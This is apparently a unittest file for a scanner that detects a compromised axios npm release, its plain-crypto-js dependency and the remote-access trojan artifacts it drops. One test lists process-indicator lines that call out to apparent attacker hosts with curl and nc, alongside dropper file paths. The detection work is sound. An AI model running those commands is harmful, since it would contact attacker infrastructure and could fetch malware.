"""Regression tests for axios_check.py (stdlib unittest, Python 3.8+).

Run from the repo root:  python3 -m unittest discover -s tests -v
"""

import contextlib
import io
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import axios_check as ac  # noqa: E402


class Base(unittest.TestCase):
    def setUp(self):
        ac.findings.clear()
        self.tmp = Path(tempfile.mkdtemp())
        self._quiet = contextlib.redirect_stdout(io.StringIO())
        self._quiet.__enter__()

    def tearDown(self):
        self._quiet.__exit__(None, None, None)
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)

    def write(self, rel, content):
        p = self.tmp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content if isinstance(content, str) else json.dumps(content))
        return p

    def found(self, severity=None):
        return [(f["severity"], f["category"]) for f in ac.findings
                if severity is None or f["severity"] == severity]


class Lockfiles(Base):
    def test_yarn_v1(self):
        self.write("yarn.lock", '# yarn lockfile v1\n\n\naxios@^1.14.0, axios@^1.2.0:\n'
                                '  version "1.14.1"\n  resolved "https://x/axios-1.14.1.tgz"\n')
        ac.check_lockfile(self.tmp)
        self.assertIn(("CRITICAL", "yarn.lock — zainfekowany axios"), self.found())

    def test_yarn_berry(self):
        self.write("yarn.lock", '__metadata:\n  version: 8\n\n"axios@npm:^1.14.0":\n'
                                '  version: 1.14.1\n  resolution: "axios@npm:1.14.1"\n')
        ac.check_lockfile(self.tmp)
        self.assertIn(("CRITICAL", "yarn.lock — zainfekowany axios"), self.found())

    def test_yarn_plain_crypto_js(self):
        self.write("yarn.lock", 'plain-crypto-js@^4.2.0:\n  version "4.2.1"\n')
        ac.check_lockfile(self.tmp)
        self.assertIn(("CRITICAL", "yarn.lock — plain-crypto-js"), self.found())

    def test_yarn_benign(self):
        # axios at a safe version; another package at 1.14.1 must not count.
        self.write("yarn.lock", 'axios@^1.14.0:\n  version "1.14.0"\n\n'
                                'lodash@^4.0.0:\n  version "1.14.1"\n\n'
                                '"@scope/axios@^1.0.0":\n  version "1.14.1"\n')
        ac.check_lockfile(self.tmp)
        self.assertEqual(self.found(), [])

    def test_npm_lockfile_v1(self):
        self.write("package-lock.json", {"lockfileVersion": 1, "dependencies": {
            "foo": {"version": "1.0.0", "dependencies": {
                "axios": {"version": "0.30.4"},
                "plain-crypto-js": {"version": "4.2.1"}}}}})
        ac.check_lockfile(self.tmp)
        self.assertIn(("CRITICAL", "package-lock.json — zainfekowany axios"), self.found())
        self.assertIn(("CRITICAL", "package-lock.json — plain-crypto-js"), self.found())

    def test_npm_lockfile_v3(self):
        self.write("package-lock.json", {"lockfileVersion": 3, "packages": {
            "": {"name": "app"}, "node_modules/axios": {"version": "1.14.1"},
            "node_modules/axios-retry": {"version": "1.14.1"}}})
        ac.check_lockfile(self.tmp)
        self.assertEqual(self.found(), [("CRITICAL", "package-lock.json — zainfekowany axios")])

    def test_pnpm(self):
        self.write("pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  axios@1.14.1:\n"
                                     "    resolution: {integrity: sha512-x}\n")
        ac.check_lockfile(self.tmp)
        self.assertIn(("CRITICAL", "pnpm-lock.yaml — zainfekowany axios"), self.found())

    def test_pnpm_version_prefix_is_not_a_match(self):
        self.write("pnpm-lock.yaml", "packages:\n  axios@1.14.10:\n  axios@0.30.40:\n")
        ac.check_lockfile(self.tmp)
        self.assertEqual(self.found(), [])

    def test_lockfiles_under_node_modules_and_git_are_skipped(self):
        bad = 'axios@^1.14.0:\n  version "1.14.1"\n'
        self.write("node_modules/x/yarn.lock", bad)
        self.write(".git/yarn.lock", bad)
        ac.check_lockfile(self.tmp)
        self.assertEqual(self.found(), [])


class PackageJson(Base):
    def spec(self, spec):
        self.write("package.json", {"name": "app", "dependencies": {"axios": spec}})
        ac.check_package_json(self.tmp)
        return self.found()

    def test_installed_bad_axios(self):
        self.write("node_modules/axios/package.json",
                   {"name": "axios", "version": "1.14.1",
                    "dependencies": {"plain-crypto-js": "^4.2.1"}})
        ac.check_package_json(self.tmp)
        self.assertIn(("CRITICAL", "Zainfekowany axios"), self.found())

    def test_exact_pin_warns(self):
        self.assertEqual(self.spec("1.14.1")[0][0], "WARN")

    def test_ranges_admitting_bad_version_are_info(self):
        for spec in ("^1.14.0", "~1.14.0", "^0.30.0"):
            with self.subTest(spec=spec):
                ac.findings.clear()
                self.assertEqual(self.spec(spec)[0][0], "INFO")

    def test_unrelated_specs(self):
        for spec in ("^1.14.10", "1.14.10", "~1.13.0", "^2.0.0", "^0.29.0", ">=1.0.0 <2", "latest"):
            with self.subTest(spec=spec):
                ac.findings.clear()
                self.assertEqual(self.spec(spec), [])


class Processes(Base):
    def run_ps(self, system, output):
        with mock.patch.object(ac.platform, "system", return_value=system), \
             mock.patch.object(ac, "_run", return_value=output):
            ac.check_processes()
        return self.found()

    def test_ld_py_substrings_are_not_hits(self):
        out = ("marek 1 python3 build.py\nmarek 2 python3 /home/marek/world.py\n"
               "marek 3 python3 old.py --x")
        self.assertEqual(self.run_ps("Linux", out), [])

    def test_linux_and_macos_indicators(self):
        for line in ("root 9 python3 /tmp/ld.py", "u 9 /Library/Caches/com.apple.act.mond",
                     "u 9 curl http://sfrclak.com:8000/6202033", "u 9 nc 142.11.206.73 8000"):
            with self.subTest(line=line):
                ac.findings.clear()
                self.assertEqual(len(self.run_ps("Linux", line)), 1)

    def test_windows_matches_programdata_wt_exe_only(self):
        wt = ac.RAT_PS_COPY_WIN
        out = (f"{wt}|\"{wt}\" -w hidden\n"
               "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal\\wt.exe|wt.exe\n"
               "C:\\Windows\\System32\\cscript.exe|cscript //nologo C:\\Temp\\6202033.vbs")
        self.assertEqual(len(self.run_ps("Windows", out)), 2)


class Artifacts(Base):
    def run_artifacts(self, system, existing):
        env = {"TMPDIR": str(self.tmp), "TEMP": str(self.tmp)}
        for p in existing:
            Path(p).touch()
        with mock.patch.object(ac.platform, "system", return_value=system), \
             mock.patch.dict(os.environ, env):
            ac.check_rat_artifacts()
        return [f["path"] for f in ac.findings]

    def test_linux(self):
        ld = self.tmp / "ld.py"
        with mock.patch.object(ac, "RAT_SCRIPT_LINUX", str(ld)):
            self.assertEqual(self.run_artifacts("Linux", [ld]), [str(ld)])

    def test_macos(self):
        mond = self.tmp / "com.apple.act.mond"
        with mock.patch.object(ac, "RAT_BINARY_MACOS", str(mond)):
            self.assertEqual(self.run_artifacts("Darwin", [mond]), [str(mond)])

    def test_temp_dropper(self):
        dropper = self.tmp / ac.DROPPER_ID
        self.assertEqual(self.run_artifacts("Linux", [dropper]), [str(dropper)])

    def test_windows(self):
        wt = self.tmp / "wt.exe"
        vbs = self.tmp / f"{ac.DROPPER_ID}.vbs"
        with mock.patch.object(ac, "RAT_PS_COPY_WIN", str(wt)):
            self.assertEqual(sorted(self.run_artifacts("Windows", [wt, vbs])),
                             sorted([str(wt), str(vbs)]))

    def test_clean_host(self):
        with mock.patch.object(ac, "RAT_SCRIPT_LINUX", str(self.tmp / "ld.py")):
            self.assertEqual(self.run_artifacts("Linux", []), [])


if __name__ == "__main__":
    unittest.main()
